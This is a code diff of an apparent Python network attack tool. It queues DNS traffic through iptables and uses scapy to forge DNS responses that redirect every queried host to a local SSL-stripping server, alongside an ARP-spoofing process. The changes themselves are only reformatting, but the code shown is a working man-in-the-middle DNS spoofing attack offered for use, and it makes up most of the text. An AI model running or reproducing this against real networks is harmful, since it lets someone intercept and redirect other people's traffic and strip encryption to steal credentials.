@@ -11,7 +11,6 @@ from netfilterqueue import NetfilterQueue
 from scapy.layers.dns import DNSQR, DNS, DNSRR
 from scapy.layers.inet import IP, UDP
 
-
 localIP = '192.168.1.74'  # SSL Strip Server Address
 
 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
@@ -26,19 +25,20 @@ def callback(data):
     else:
         host = pkt[DNS].qd.qname
         print "Detect DNS query %s" % host
-        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-                      DNS(
-                          id=pkt[DNS].id,
-                          qr=1,
-                          aa=1,
-                          qd=pkt[DNS].qd,
-                          an=DNSRR(
-                              rrname=host,
-                              ttl=10,
-                              rdata=localIP
-                          )
-                      )
+        spoofed_pkt = \
+            IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+            DNS(
+                id=pkt[DNS].id,
+                qr=1,
+                aa=1,
+                qd=pkt[DNS].qd,
+                an=DNSRR(
+                    rrname=host,
+                    ttl=10,
+                    rdata=localIP
+                )
+            )
         print "Spoof %s to me!" % host
         data.set_payload(str(spoofed_pkt))
         data.accept()
@@ -67,6 +67,7 @@ def main():
         q.unbind()
         arp_process.join()  # Escape ARP loop
         cleaner()
+
 
 if __name__ == '__main__':
     main()
